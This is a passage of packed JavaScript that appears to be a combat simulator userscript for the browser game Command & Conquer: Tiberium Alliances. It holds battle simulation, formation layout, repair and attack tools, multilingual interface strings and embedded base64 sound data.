1e.1Q.3U.2b[t]&&-1<1e.1Q.3U.2b[t].28().4D(F)&&6==t.2B){F=t;22}1d C=1e.1Q.3U.2b.3m.28(),u;24(u in 1e.1Q.3U.2b)if(1e.1Q.3U.2b.4B(u)&&"1c"===2E 1e.1Q.3U.2b[u]&&-1<1e.1Q.3U.2b[u].28().4D(C)&&6==u.2B){C=u;22}1d s=1e.3Y.2n.8S.28(),s=s.cI(F,C),J=s.CC(s.4D("{")+1,s.CB("}")),K=5w("a,b,c",J);1e.3Y.2n.8S=K}24(1d v in 1e.1P.2u.2u.2b)if("1c"===2E 1e.1P.2u.2u.2b[v]&&(s=1e.1P.2u.2u.2b[v].28(),-1<s.4D(1e.1P.2u.2u.2b.Cw.28()))){1j.1l("1e.1P.2u.2u.2b.8F = 1e.1P.2u.2u.2b."+v);5w("","1e.1P.2u.2u.2b.8F = 1e.1P.2u.2u.2b."+v)();x="1e.1P.2u.2u.2b."+v+"=1c (a){if(1e.1P.6k.2L().CT()==7&&2d.2m.2j().1V.3k.3J){2v;}3q{14.8F(a);}}";5w("",x)();1j.1l(x);22}qx.3h.3w.3v().6c().8D=qx.3h.3w.3v().6c().cA;qx.3h.3w.3v().6c().cA=1c(b){2d.2m.2j().1V.3k.3M?qx.3h.3w.3v().6c().8D(!1):qx.3h.3w.3v().6c().8D(b)}}3q G++,2d.3C(q,4G);3q 2d.3C(q,4G)}3q 2d.3C(q,4G)}1u(D){"3V"!==2E 1j?1j.1l(D):2d.d6?d6.Ed(D):Ef(D)}}1j.1l("2m: 7E Eb");1d p=18,w="E9 Ea DQ DP Dy Dw Dz DA".1h(" "),z={2J:"\\DB ah ae\\ac ab ai Dv Dt dx".1h(" "),"cR 1z:":"D\\7g\\Dp \\Do\\7g:;Dq d0:;1z Dr:;1z Ds:;DC d0:;DD\\DL b\\bR:;1z DN:;DO DK:".1h(";"),"cY:":"c0 \\DJ:;DF:;DE:;bY:;DG:;V\\DH:;D\\DI:;G2:".1h(";"),"cs:":"Gx: Iq\\Is: It\\Io: Im: Ij: \\Ik\\Il: B\\Iu: ID:".1h(" "),"9e bT:":"\\IE:;IF:;IG:;IC:;Ix:;K\\c2:;Iw De 9e:;Iy:".1h(";"),"9d c1:":"c0 Iz:;IA:;Ig\\2H\\6i de If:;HY di bY:;HX:;V\\HZ B\\bR:;I1 De D\\HW:;HR:".1h(";"),"bJ bI:":"HQ HS:;HT:;bO de bN:;bO di bN:;I2:;I3 k\\c2:;Ib De Ic:;Id:".1h(";"),"7A 3b:":";;;;;;;Ia j\\I9\\1L:".1h(";"),"7A cj:":"       Hy\\5E\\I5\\1L:".1h(" "),"ch:":"T\\II cn:;I8:;IH:;4f:;IK:;\\Jf\\3c:;4H:;Jb\\1L:".1h(";"),"4c:":"Je: 5D: Jd: Jc: 5D: Jh\\Ji: 5D: Ja\\84:".1h(" "),"94:":"Jg cn:;8c:;Jj\\Jl:;Jm:;Jk:;J\\IQ:;V\\IS:;IT:".1h(";"),"93:":"IU d1\\d2\\3T:;83:;IP\\6i:;IO:;J9:;L\\IJ:;IL:;IM:".1h(";"),"c6:":"IN\\2H: IV: IW: J4: J5: J7\\cf: R\\J3: J2:".1h(" "),ca:"IY IX J0 J1 I6 HO GD GF".1h(" "),"73 8q:":"bW\\9n S\\GH:;GC:;bD de GB:;bD di HP:;Gy:;bV Gz:;GA\\fx Du 4A:;GI GJ:".1h(";"),8n:"GR\\9n 8n GS\\2H\\6i GT GU cX\\3c GQ GP".1h(" "),7P:"Y\\b8 GL ba bb bg T\\GK\\3c bf bd".1h(" "),"7P 14 5d 1B.":"b3\\b2\\3T 8z\\8A y\\b8.;GM 8r GN.;ba 7z 8t\\2H\\3P am.;bb 8B 7Y aS.;bg aJ cE 7Z.;T\\GO be 7U az cw 7w\\8a.;bf 7V 85.;bd cy 86.".1h(";"),7v:"Gv L\\bC bl ak av T\\Gu\\3c cv 3o".1h(" "),"8f: ":"\\Gb: ;8f: ;aV: ;aV: ;Gd: ;N\\Ge: ;Gf: ;Ga: ".1h(";"),"7v 14 5d 1B.":"b3\\b2\\3T 8z\\8A G9.;G5\\G4 8r l\\bC.;bl 7z 8t\\2H\\3P am.;ak 8B 7Y aS.;av aJ cE 7Z.;T\\cU\\G6 7U az cw 7w\\8a.;cv 7V 85.;3o cy 86.".1h(";"),7F:"G7 G8 bM ck Gg Gh\\3c cb cd".1h(" "),"7F 14 1B.":"Bu 8z\\8A Gr.;8r Gs.;bM 7z 8t\\2H\\3P.;ck 8B 7Y.;Gt 7Z Go.;Gj el 7U az 7w\\8a.;cb 7V 85.;cd Gi 86.".1h(";"),4u:"Gk 4u 4u 4u 4u 4u Gm GV".1h(" "),6f:"9p 9p F\\GW 9p 6f F\\Hw 6f Hx".1h(" "),c4:"Hz HA Hu\\Hp Ho Hq Hr\\Hs\\cf HB HC".1h(" "),4Z:"HK\\HL: HM HN\\2H\\6i: HJ: HI: HD\\HF: 4Z: Hn".1h(" "),"7D cg 1g":"Bu H5 H4 g\\7B;H6 H7 cl \\db;c3 7z H8 cm;d8 cm la GY GX;GZ H0 cl bP;H1 d5 H9\\Ha bL\\6g\\bK;bG. 7D. de Hi Hj\\Hk;N\\3z\\1L dt 5C Hl".1h(";"),"5o ci 17":"Hg\\Hc tu\\He\\d9\\3T g\\7B;Hf CG;c3 9b\\6i de wS;wR i wT di wU;wW bP;wV\\9j wQ bL\\6g\\bK;bG. 7D. wP de D\\wK;N\\3z\\1L 8v wJ".1h(";"),"bQ!":"wL\\3T! wM! wO! wN! wX! wY! x8! x7!".1h(" "),bZ:"x9 et;xa;xc;xb;x6;x5\\8H\\9j;x0;wZ".1h(";"),"9o 4A 3W":"bW\\9n x1 Ba\\x2;x4 x3;wI\\Ct a wH\\2H\\3P de cZ;wl wk;9o wm;bV d3\\8H\\9j wn\\6g\\5m;D\\wp 6w 3W Du 4A;wo du wj".1h(";"),56:"D\\wi wd wc\\2H\\3P 56 we cX\\3c cV wf".1h(" "),"9g to 4A 56":"wh d\\wg g\\7B;wq\\wr wB wA;wC \\4X wE\\2H\\3P de cZ;wG wF wz;wy wt ws wu;wv az wx\\6h 7w\\3c\\ww;xd \\4X l\'cV xe xU;9g to 4A 56".1h(";"),4d:"xW a\\2H;bk;9c;fr;98;xY;xX;7c".1h(";"),"5K 7E cT":"xS\\cU d1\\d2\\d9\\3T G\\7B;xR \\db;xM as xL do xN;d8 xO;5K 7E xQ;xP a d3\\xZ y0\\8H\\ya d5\\y9;yb 4U R\\yc Du ye;7c yd ty\\y8".1h(";"),"4h 2r 2f":"7y y2 7x\\4y;5J 7H cP 7T;7R as 7S 7K a y1;7N le 7O\\4X a y3;7u 7r cP;6N\\6h 6M\\5m y4;D\\6L 4U 5k\\3c 6J 6w bE;6K\\1L\\1L 6O\\6P\\1L y6".1h(";"),"4h 2r 26":"7y sa\\xK 7x\\4y;5J 7H cz 7T;7R as 7S 7K a xJ;7N le 7O\\4X a xo;7u 7r cz;6N\\6h 6M\\5m xn;D\\6L 4U 5k\\3c 6J 6w bo;6K\\1L\\1L 6O\\6P\\1L xp".1h(";"),"4h 2r up":"7y xq\\3T 7x\\4y;5J 7H xs 7T;7R as 7S 7K xr;7N le 7O\\4X in xm;7u 7r xl;6N\\6h 6M\\5m xg;D\\6L 4U 5k\\3c 6J 7l xf;6K\\1L\\1L 6O\\6P\\1L yl\\xh".1h(";"),"4h 2r cC":"7y a\\xk\\br\\3T 7x\\4y;5J 7H xj 7T;7R as 7S 7K xt;7N le 7O\\4X in xE;7u 7r xD;6N\\6h 6M\\5m le;D\\6L 4U 5k\\3c 6J 7l xG;6K\\1L\\1L 6O\\6P\\1L xI".1h(";"),"4H 5l":"aw dc;xH;bq\\aD 4H;aE 4f;4f aF;ay xC;aG 4f;xB aC".1h(";"),5l:"dc xw bq\\aD aE aF xv aG aC".1h(" "),"4H aB":"aw xx;4f xy;xA xz;wb 4f;4f wa;ay uM\\uL;D\\uN 4f;4H uP".1h(";"),"6T 8T ":\'uK uJ ;uE uD ;N\\uF do uG ;uI 8T ;uH ;"6T" \\uR\\uS v2 ;v1. Du 6T ;v3\\v4 v6 \'.1h(";"),8X:"af ag v5 a9 ad v0\\6g ar P\\ap\\1L".1h(" "),"8X 2J":"\\uZ af;ag ah;ae\\ac;a9 ab;ad ai;uU\\6g\\3c 2J;ar 4U 2J;P\\ap\\1L 5C".1h(";"),"ao:":"uY: uX uC:  uB  C\\uc\\ub ud:".1h(" "),at:"ue aL ug  aL  bE uf".1h(" "),aT:"ua\\br bs u9  bs  bo u4".1h(" "),"bj:":"u3: bk u5:  u6:  V\\u8: u7:".1h(" "),4o:"eY\\4y\\3T uh uj  uv  uu Hy\\5E\\uw".1h(" "),3b:"fF\\fE 82 uy  uA  R\\uz ut".1h(" "),7p:"       fK".1h(" "),"3W bv be bx on by bi bh 1g!":"us en um g\\ul un g\\uo ur\\uq\\4y!;v7 3W v8 dq vP vO vQ vR;A vT\\2H\\3P vS vN vM na vH vG 2o!;;vI vJ vL vK op vU vV w5 w4!;;6w 3W w6 w7\\fx en w9 w8 w3\\w2 1g vW\\vY !;vZ w1 w0\\vF p\\vE vi!".1h(";"),"4d 4o 1U":"eY\\4y\\3T D\\7g\\fv vk A\\2H;vm fG;9c o 9b\\3P de vl;fr vg d\'vf;98 va;a T\\v9\\vb vc ve\\5m;D\\fn 7l eX d\'vn;3o hy\\5E\\vo f7".1h(";"),"4d 3b 1U":"fF\\fE D\\7g\\fv vz A\\2H;vy fG;9c 9b\\3P de vA\\2H\\3P;;98 vC;;D\\fn 7l eX de R\\vw;3o vv f7".1h(";"),"4d 7p 1U":";;;;;;;7c vr\\1L vs".1h(";"),"7e to fD":";vu vt yf;;;;;;yg B3".1h(";"),"7p 72":";;;;;;;fK 8v B2".1h(";"),"7o 87":";87 dP;;;;;;K\\1L\\dL\\1L B4".1h(";"),"7o dO":";B5 dP;;;;;;K\\1L\\dL\\1L B7".1h(";"),"3x 5G":";dG 5h;;;;;;5A dH".1h(";"),"2P 5G":";dG 5F;;;;;;3o dH k\\3z\\4F\\1L".1h(";"),"3x 4c":";5D 5h;;;;;;5A dI\\84".1h(";"),"2P 4c":";5D 5F;;;;;;3o dI\\84 k\\3z\\4F\\1L".1h(";"),"3x 5z":";8c 5h;;;;;;5A dR".1h(";"),"2P 5z":"8c 5F;;;;;;;3o dR k\\3z\\4F\\1L".1h(";"),"3x 4m":";83 5h;;;;;;5A dZ".1h(";"),"2P 4m":";83 5F;;;;;;3o dZ k\\3z\\4F\\1L".1h(";"),"3x 3b 4z":";82 dT 5h;;;;;;5A dU".1h(";"),"2P 3b 4z":";82 dT 5F;;;;;;3o dU k\\3z\\4F\\1L".1h(";"),"dV: ":";;;;;;;Bk: ".1h(";"),"dF 5d dE on dn dp":";Bj Bl dq Bm Bo Bn;;;;;;Bi Bh Bc Bb Bd".1h(";"),"dr \'dm-1H to (De)dg 2r":";Bf-AT AS 5J (De)-5h ;;;;;;Ax Ay/AA eD\\Az".1h(";"),"5o 2J 7f 4o":";;;;;;;N\\3z\\1L 5C -8p hy\\5E\\eO dA".1h(";"),"5o 2J 7f 3W":";;;;;;;N\\3z\\1L 5C -8p dt dA".1h(";"),"7e 5l-dD dz 73":";;;;;;;An du j\\Ap Aq".1h(";"),"2J 59 dw":";;;;;;;dx -As l\\Ar\\AB".1h(";"),"70 5k 74 In e3 72 8s":";;;;;;;3o k\\3z\\4F\\1L eD\\AM ty\\eF 8v AL".1h(";"),"70 74 In 4o ew ex":";;;;;;;3o ty\\eF k\\3z\\4F\\1L hy\\5E\\eO AE".1h(";"),8y:"       AD".1h(" "),8x:";;;;;;;AF AG".1h(";"),"5K 2J 59":";;;;;;;7c 5C -8p".1h(";")},G=0;/eb\\.ec/i.ed(7b.e9)&&2d.3C(q,4G)}.28()+")();";p.es="1R/Cb";/eb\\.ec/i.ed(7b.e9)&&7b.C6("C5")[0].C0(p);2d.4J={f4:"C1 C2 C4; f6 in 2m; fq of: 6Y://ff.fg.co.uk",d:"2o:fu/eV;2A,C3///////////////ft+eQ+eM+eL+eH/eI/eJ/5v/5v/5v/ea/e8/e5+ep+eo/ef+e7+e6+ev+ez+eA+dv+dB+fC+fJ+b9+Cd+Ce+Co/Cn++Cp/Cq/Cr+Cm+Cl/Cg/Cf+Ch/Ci/Ck/Cj/BY/X+BX+BB+BA/O/BC+BD/7+BF/BE/Bz+By+Bs/Br+Bt+Bv/Bx+Bw/BH/BI/BS/BR/BT+BU+BW+BV+BQ/BP/BK/BJ+BL/BM/BO/BN/pl+Am+Al+yY+u+yX+7d+yZ+z0/z2/z1+yW/yV/yQ//yP/yR/yS+yU+yT/z3+z4/ze+zd/zf+zg/zi+zh/zc+zb+z6+z5/z7+z8/za+z9/yO/7J+yN/ys/yr+yt/yu/yw+yv+yq/yp+yj+yi/yk+ym+yo+yn/yx/yy+yI/yH+yJ/yK/yM+yL+yG/yF+yA+yz/O/yB+yC+yE/yD+zj+zk+A0+zZ+A1/A2+A4+A3/zY/+zX+zS/Y/zR/zT/zU+zW/zV/A5/A6/Ag+Af++Ah+Ai+Ak+Aj+Ae+Ad+A8/A7/A9+Aa/Ac/Ab/zQ+zP+zu/zt/zv/zw+zy/zx+zs/v/zr+zm/zl/zn/zo+zq+zp/zz/zA/zK/zJ/zL++tH/2x/zM+zO/zN+zI/zH/zC/zB/zD/zE+zG/zF/Fk/BZ+Cc/Ca+C9+C7+C8+Bq+Bp+AH+AI+AJ+AK+AQ+AR/AO+AN/AC/Ao+At+Au/Av+Aw+Bg/Be/J/B9+B8/AY/AZ+AX/AW+AU+AV+B0+B1+B6+vp/vq/vD+vB+vd+vj+vh+vX/uW+uV+uT+uQ+uO/xF/xu/xi/y5+y7/xV/xT+Cs+Hh+HG+Hv/Gl/Gp+Gq+G3+E6/E7+Ec+Eg+s+E3/DV+DT+DR+DS/DW/DX+DY+DZ+Dn/Dm/CM/CL/6+CN+CO+CS/CR+CQ//CH/Cy/Cx+Cv+Cz/CA+CE/CU/CV+Y/1+Dd/Da/Di/D9+CW/CX+D7//D6+Eh/Ft+Fq/Fg/Ff/FC/+FV/FX/FZ/FY/FO/FH/FG/FF+FD+FE/FI+FJ/l/FM+FL/FK/Fb+Fa+EB+EA+Ez/Ex++Ey+ED+EH++EG//EF+Ew/Ev"};2d.4O={f4:"Em El; f6 in 2m; fq of: 6Y://ff.fg.co.uk; F5 F9",d:"2o:fu/eV;2A,F7///////////////ft+eQ+eM+eL+eH/eI/eJ/5v/5v/5v/ea/e8/e5+ep+eo/ef+e7+e6+ev+ez+eA+dv+dB+fC+fJ+b9+Ir+Ii+Ih+Iv+IB+mm+I0+HV/HU+I7/J8/IZ/GE/GG/Gc+Ht+HE+HH+nz/hi+gQ+hQ/hP+ic+j5/i6/jI/jP+hq+h5/h6/gK/hz/g3/fW+gC/gG/x/kC/kD//k7/jr/it/ia+iX+k2+iN+jd+k1+p+gT/gO/gS/h2+ho+/hL/i1+hZ+gv+gi+gq/81+7//gl/gx+gp/gr+D+ig/ih/jb/j/ja/7/+j0/yh+j3/iP+iS+6W+/iV/iU/gy//gA/g8/qP/qL+r9+rw+rr+rs/rt/rD/rC+3/F+rA/oW+oS/oT/oZ/+p0+p6+p4/p3+i+p1/W/y+p2/og+y/nt+nq/nr/ny/no/n6+nm/nF+o4+Fu"}})();',62,2813,'||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||this|||buttons|null|new|attack|add|function|var|ClientLib|options|stats|split|labels|console|getValue|log|row|column|addListener|basic|damage|setValue|set|strong|catch|try|form|case|Label|Base|100|layout|localStorage|repair|structures|layouts|width|click|toolBar|png|overall|u00e4|top|_armyBar|_MainData|Vis|Data|text|toolTipText|appearance|Button|saveObj|small|button|view|JSON|||break||for||right||toString||available|prototype|setLayout|window|height|left|battleResultsBox|health|userInterface|getInstance|simulate|attacks|TACS|Util|data|lastUnitList|get_Id|units|Composite|container|BaseView|return|repairInfo||infantry|get_Cities|base64|length|webfrontend|toolBarMouse|typeof|parse|image|u00e7|aircraft|Stats|vehicle|GetInstance|remove|Math|show|Deactivate|activateVehicles|activateAir|activateInfantry|repairinfos|repairButtons|optionsWindow|spoils|setOpacity|icon|icons||phe|setEnabled|setZIndex|||cnc|switch||setThemedBackgroundColor|eef|Repair|u00e9s|_VisMain|colSpan|current|stringify|core|setThemedFont|bold|checkbox|all|get_CurrentOwnCity|toolbarRefreshStats|Poista|getLayoutParent|else|_Application|statsOpacity|EResourceType|CheckBox|getApplication|Init|Activate|padding|u00e4yt|activateAll|construction|setTimeout||repairMode|unlock|rightSide|showStatsDuringAttack|EUnitMovementType|disableAttackPreparationTooltips|label|command|disableArmyFormationManagerTooltips|skipVictoryPopup||u00e3o|setToolTipText|showStatsDuringSimulation|FactionUI|u0131|Cities|undefined|Simulation|statsPage|API|gui||VBox|time|autoDisplayStats||||defense|PlayerAreaViewMode|supportLevel|audio|countDown|Infantry|Unlock|updateLabel100|Totale|markSavedTargets|Shift|showShift|support|dblClick2DeActivate|_armyBarContainer|Air|Grid|Attack|list|repairLock|middle|getTimespanString|attackLock|Info|getPlayArea|get_CoordY|get_CurrentCity|u0131r|Mode|Combat|hasOwnProperty||indexOf|get_CoordX|u00f6st|1E3|Total|setColumnAlign|soundRepairImpact|set_Enabled|armybarClickCount|undoCache|setWidth|soundRepairReload|slice|bottom|shiftFormationDown|floor|TOOL_BAR_WIDTH|Les|shiftFormationLeft|playerCity|u00e0|shiftFormationRight|Options||setColumnFlex|save|||shiftFormationUp|Setup|count||Window|get_Battleground|availableAttacksAtFullStrength|EFactionType|saved|saveLocation|toFixed|formatNumberWithCommas|Aktivieren|getBounds|changeValue|Unit|Victory|u00e1sa|curPAVM|Show|onCityLoadComplete|get_Time|GetTimeSpan|toggleCheckboxOption|loadFormation|simulationWarning|3fd|Function|isVisible|ta_sim_showShift|Vehicles|Aktivoi|skip|tiedot|Infanterie|u00f6kk|Deaktivieren|All|bounds|back|Einheiten|Open|tools|outcome|ToggleButton|open|flipVertical|targetCityId|research|formationReset|GetResourceCount|hide|Battleground|flipHorizontal|toolbarRedo|getRepairCost|max||toolbarShowStats|shiftFormation|push||get_Enabled|get_UnitGameData_Obj||updateLabel100time||_PlayArea|ta_sim_attackLock|getArmyUnitTooltipOverlay|ta_sim_repairLock|slider|Forums|u00edt|u00e9gek|u00f5es|setThemedPadding|VisMain|VisObject|get_VisObjectType|match|saveData|Date|toolbarUndo|Image|warningIcon|load|EObjectType|getFormation|La|tabview|buttonLayoutDelete|clearInterval|Atom|common|crystal|credit|getAudioSettings|optionStats|tiberium|updateSaveMarkers|setupInterface|Vers|Siirt|u00e9placer|eltol|Egys|yksikk|u00f6j|RegionNPCCamp|updateLayoutsList||Support|get_BasePlate|getTimestamp||setLabel|http|Region|Disable|createBasePlateFunction|Formation|Battle|Tooltips||appear||repairButtonsRedrawTimer|Net|availableAttacksCP|document|Avaa||Skip|During|u00fc|statsOpacityLabel|leftSide|activateUnits|execute|Le|statsOpacityOutput|close|Flip|Reset|setLabelColor|eenheden|armybarClearnClickCounter|textColor|Verschuif|Delete|elrendez|kayd|Birlikleri|esta|Available|u00f6ster|playerCityDefenseBonus|Auto|Simulator|Save|onSimulateBattleFinishedEvent|nach|white||para|statsOnly|set_Enabled_Original|Spostare|unit|Load||Deslocar|unidades|bewegen|ezt|Cette|reports|decorator|formazione|indeling|||Reparatur|Flugzeuge|u00e4ki|Disposition|asetelma|Horizontal|decoration|green|u00e9st|Background|Fahrzeuge|getViewMode|round|Name|GetCityUnit|EUnitGroup|GetRepairTimeFromEUnitGroup|availableCP|attackCost|playSound|availableAttacksWithCurrentRepairCharges|Layouts|500|ikkuna|Time|Layout|Manager|forma|resetDisableButtons|armeijan|center|Redo|Undo|dizili|u015fi|questa|ownCityId|setVisibility_Original|ta_sim_popup|ShowToolTip_Original|get_Player|u00e1ci|pavmCombatSetupDefense|RepairChargeVeh|RepairChargeAir|formationChangeHandler|toggleOptionsWindow|GDIFaction|NODFaction|ts2|ts1|icon_forum_properties|GetUnitRepairCosts|lvl|setPlateColor|setHeight|Canvas|Refresh|EBackgroundPlateColor|RepairChargeInf||updateRepairTimeInfobox|Type|Aircraft|Vehicle|volume|TOOL_BAR_HIGH|visibility|Ontgrendel||setTextColor|bot|Desbloquear|Defense|Construction|removeAllRepairButtons|Return|setResizeTimer|repairModeTimer|u00f3|setInterval|toggleEnabled|redrawRepairButtons|u015f|Start|Forum|toggleTools|set_ReplaySpeed|getAllUnitsDeactivated|attachNetEvent|CCTAWrapper_IsInstalled|object|battleResultsBoxLeft|ta_sim_options_top|MoveBattleUnit_Original|counter|regionObject|enterSimulationView|setLayoutProperties|EPlacementType|mouseover|ta_sim_last_city|option|setView|battleResultsBoxTop|110|HBox|MoveBattleUnit|saveLayouts|GetOffenseConditionInPercent|restore|Page|flipFormation|ta_sim_marksavedtargets|ta_sim_dblClick2DeActivate|contentPaddingRight|contentPaddingBottom|contentPaddingTop|contentPaddingLeft|locksLabel|00|sideLabel|TOOL_BAR_LOW|lastSimulation|get_PosX|getAvailableRepairAndCP|PATH|get_PosY|getUIItem|Missions|ta_sim_side|Rinfrescare|160|Statistiche|u00edstica|Verversen|Estat|Yenile|Erfrischen|Statistik|Statistieken|RegionCityType|Cancella|RegionNPCBase|guardada|get_GridHeight|Side|u00e4ivit|initializeStats|Actualiser||Left|get_GridWidth|Verwijder|Mutlak|PerforceChangelist|Teljes||initialize|Defeat|Voitto|u00f3ria|Vittoria|Overwinning|Victoire|badClone|scale|deze|130|Links|Black|getTime|checkAttackRange|saveCityLayout|moveTo|timerEnd|salvata|Right|refreshStatistics|Nome|getWidth|get_RepairChargeOffense|loadLayouts|optionRepairLock|resetDblClick|108|u0131tl|Kay|get_RepairOffenseResources|Resource|initializeInfo|resize|u00fckle|sRxHtq77ujD8xnAkAAA8wQEAqMCG1RFOisYCCw1ZCQBkAAAQxiBkEFLIIIQUUkgphJRSAgAABhwAAAJMKAOFhqwEAKIAAAAirLXWWmOttdZai6y11lprraWUUkoppZRSSimllFJKKaWUUkoppZRSSimllFJKKaWUUgEAUhMOAFIPNmhKLA5QaMhKACAVAAAwhimmHIMMOsOUc9BJKCWlhjHnnIOSUkqVc1JKSam11jLnpJSSUmsxZhBSaS3GGmvNIJSUWowx9hpKaS3GWnPPPZTSWou11txzaS3GHHvPQQiTUqu15hyEDqq1WmvOOfggTGux1hp0EEIYAIDT4AAAemDD6ggnRWOBhYasBABSAQAIhJRizDHnnENKMeacc845h5RizDHnnHNOMcacc85BCKFizDHnIIQQQuacc85BCCGEzDnnnIMQQgidcw5CCCGEEDrnIIQQQgghdA5CCCGEEELoIIQQQgghhNBBCCGEEEIIoYMQQgghhBBCAQCABQ4AAAE2rI5wUjQWWGjISgAACAAAgtpyLDEzSDnmLDYEIQW5VUgpxbRmRhnluFUKIaQ0ZE4xZKTEWnOpHAAAAIIAAAEhAQAGCApmAIDBAcLnIOgECI42AABBiMwQiYaF4PCgEiAipgKAxASFXACosLhIu7iALgNc0MVdB0IIQhCCWBxAAQk4OOGGJ97whBucoFNU6iAAAAAAAA4A4AEA4LgAIiKaw8jQ2ODo8PgACQkAAAAAABwA|Carregar|Carica|ta_sim_layouts|Lataa||Charger|Laad|refreshed|recently|Locks|Freigabe|Apagar|lastUnits|get_Faction|Droite|backgroundImage|Vit|u011f|Rechts|optionPopup|SimulateBattle|will|initializeLayout|based|most|loadCityLayouts|optionAttackLock|optionShowShift|u00f6schen|Tempo|Gauche|resizable|Affich|section|Center|Command|u00e9se|megjelen|Guardar|Comando|Centro|weergeven|Warning|u00e1zis|pavmCombatReplay|Yard|countDownToNextSimulation|Csata|Sava|loadData|Difesa|Simulate|Savunma|Facility|u00f6zpont|Mostrar|Spoils|155|Outcome|740|get_CityArmyFormationsManager|initToolBarListeners|Unknown|Sauvegarder||Tallenna|updateStatsWindow|u00e9ny|display|Overall|shift|Attacks|Salva|automatisch|automaticamente|Birlikler||Creating|missing|MainData|Buildings|loadCityLayout|getSelection|Effacer|elmentett|deleteCityLayout|valittu|rechts|setVisibility|script|down|400|opgeslagen|allowMinimize|125|getChildControl|replace|allowMaximize|showMinimize|ta_sim_options_left|getLayoutProperties|getModel|showMaximize|links|200|Enemy|GetNerfAndBoostModifier|Tools|u00f6r|Organisation|_ActiveView|Elrendez|Defences|combate|Basis|Ara|u00e7lar|szimul|ViewModeChange|ablak|opera|OnSimulateBattleFinished|Apri|u0131n|now|u00f6ffnen|Zafer|timerStart||CurrentOwnChange|activate|curViewMode||hideAll|GetActiveView|ownCityChangeHandler|Double|region||map|auf|Enable|rich|simuloinnin|taistelun|q2I1meJ4qqqqq2bXmeKaqqqrqurlueJ4qqqrquq|Opacity|Tiedot|getAttackUnits|After|aikana|ueaaqqqrquLOu|calculateLoot|Popup|targets|Mark|Alle|kaikki|jalkav|href|unlockRepairs|u00e4nn|unlockAttacks|_blank|Vertical|Spiegeln|userscripts|ajoneuvot|138212|Modus|korjaustila|Version|discuss|gameOverlaysToFront|org|lentokoneet|rpois|scripts|calculateDefenseBonus|Army|OVL_PLAYAREA|Wbd|E1X9oVb143j1n1nGV2XrsqyL6yyrAy37xvD7vvCstq2ccy2jmvryrH7SmX3lWV4bdtXZl0nzLptHLuvM35hSAAAwIADAECACWWg0JAVAUCcAACDkHOIKQiRYhBCCCmFEFKKGIOQOSclY05KKSW1UEpqEWMQKsekZM5JCaW0FEppKZTSWikltlBKi621WlNrsYZSWgultFhKaTG1VmNrrcaIMQmZc1Iy56SUUlorpbSWOUelc5BSByGlklKLJaUYK|XbVsZbl1HVFVfV2VZ|zNE8TPdETPdNTRVd0gdCQVQAAIACAAAAAAAAADMmwFMvRHE0SJdVSLVVTLdVSRdVTVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVTdM0TRMIDVkJAAABAMAchM4tqJBJCS2YiijEJOhSQQcp6M4wgqD3EjmDnMcUOUKQxpZJhJgGQkNWBABRAACAMcgxxBxyzlHqJEXOOSodpcY5R6mj1FFKsaYYM0oltlRr45yj1FHqKKUaS4sdpRRjirEAAIAABwCAAAuh0JAVAUAUAACBEFIKKYWUYs4p55BSyjHmHFKKOaecU845KJ2UyjkmnZMSKaWcY84p55yUzknlnJPSSSgAACDAAQAgwEIoNGRFABAnAOBwHM2TNE0UJU0TRU8UXdUTRdWVNM00NVFUVU0UTdVUVVkWTdWVJU0zTU0UVVMTRVUVVVOWTVWVZc80bdlUVd0WVVW3ZVv2bVeWdd8zTdkWVdXWTVW1dVeWdd2Vbd2XNM00NVFUVU0UVddUVVs2VdW2NVF0XVFVZVlUVVl2Zde2VVfWdU0UXddTTdkVVVWWVdnVZVWWdV90VV1XXdfXVVf2fdnWfV3WdWEYVdXWTdfVdVV2dV|domain|3fV0HQkNWAQASAAA6kiMpkiIpkuM4jiRJQGjIKgBABgBAAACK4iiO4ziSJEmSJWmSZ3mWqJma6ZmeKqpAaMgqAAAQAEAAAAAAAACKpniKqXiKqHiO6IiSaJmWqKmaK8qm7Lqu67qu67qu67qu67qu67qu67qu67qu67qu67qu67qu67quC4SGrAIAJAAAdCRHciRHUiRFUiRHcoDQkFUAgAwAgAAAHMMxJEVyLMvSNE|commandandconquer|com|test|get_CombatSetup|ArPdO0ddNVdd1UXV|CommandResult|createEventDelegate|returnSetup|CommunicationManager|repairResult||playRepairSound||VZd0WVVW3Vdn1dVN1dV22bWOYbVsXTlW1dVV2dWGVXd2XddsYbl33jc00bdt0XV03XVfXbV03hlnXfV9UVV9XZdk3Vln2fd33sXXfGEZV1XVTdoVfdWVfuHVfWW5d57y2jWz7yjHrvjP8RnRfOJbVtimvbgvDrOv4wu4su|XdV1YJk0zTU0UXVUTRVU1VdW2TVWVbU0UXVdUVVkWTdWVVdn1ddV1bV0TRdcVVVWWRVWVXVV2dd|delete|getItem|type||parseInt|ekZNBR6SCkVFKJqaQUYyglxpJSjCWlGluKLbcYcw6ltFhSibGkFGOLKccWY84RY1Ay56RkzkkppbRWSmqtck5KByGlzEFJJaUYS0kpZs5J6iCk1EFHqaQUY0kptlBKbCWlGktJMbYYc24pthpKabGkFGtJKcYWY84tttw6CK2FVGIMpcTYYsy5tVZrKCXGklKsJaXaYqy1txhzDaXEWFKpsaQUa6ux1xhjzSm2XFOLNbcYe64tt15zDj61VnOKKdcWY|Preparation|View|pavmCombatSetupBase|4xtyBrzr13EFoLpcQYSomxxVZrizHnUEqMJaUaS0mxthhzba3WHkqJsaQUa0mpxhhjzrHGXlNrtbYYe04t1lxz7r3GHINqreYWY|4ptpxrrr3X3IIsAABgwAEAIMCEMlBoyEoAIAoAADCGMecgNAo555yUBinnnJOSOQchhJQy5yCEkFLnHISSWuucg1BKa6WUlFqLsZSSUmsxFgAAUOAAABBgg6bE4gCFhqwEAFIBAAyOY1meZ5qqasuOJXmeKKqmq|resetFormation|skipSimulation|yksik|showCombatTools|u00f6kaluvihjeet|pavmCombatViewerAttacker|4555qDtFZaa621UkoppZRSCkJDVgEAIAAABEIGGWSQUUghhRRiiCmnnHIKKqiA0JBVAAAgAIAAAAAAT|Ic0REd0REd0REd0REd0fEczxElURIlURIt0zI101NFVXVl15Z1Wbd9W9iFXfd93fd93fh1YViWZVmWZVmWZVmWZVmWZVmWIDRkFQAAAgAAIIQQQkghhRRSSCnGGHPMOegklBAIDVkFAAACAAgAAABwFEdxHMmRHEmyJEvSJM3SLE|zNE8TPVEURdM0VdEVXVE3bVE2ZdM1XVM2XVVWbVeWbVu2dduXZdv3fd|Inf|BqEZ0F4FoRpQQghhCRBSJCDBkHIGIRGQViSgwY5uBSEy0GoGoQqOQgfhCA0ZBUAkAAAoK